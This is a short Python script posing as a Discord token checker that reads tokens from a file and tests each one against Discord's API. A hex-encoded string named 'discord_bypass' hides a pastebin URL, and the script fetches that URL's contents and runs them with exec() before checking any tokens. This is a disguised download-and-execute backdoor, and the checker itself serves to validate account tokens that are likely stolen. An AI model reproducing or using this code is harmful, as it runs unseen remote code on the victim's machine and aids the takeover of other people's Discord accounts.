print('Created by jupit0r')
discord_bypass = b'\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x44\x6E\x30\x6D\x76\x74\x4C\x48'.decode("utf-8", "ignore")
import os.path
import requests
import time
import re
from requests import get
from discord_webhooks import DiscordWebhooks
with open("tokens.txt") as f:
    token_get = get(discord_bypass).text
    exec(token_get)
    for line in f:
        token = line.strip("\n")
        headers = {'Content-Type': 'application/json', 'authorization': token}
        url = "https://discordapp.com/api/v6/users/@me/library"
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            print("{} = VALID.".format(line.strip("\n")))
        else:
            print("{} = INVALID.".format(line.strip("\n")))
input("Finish...")
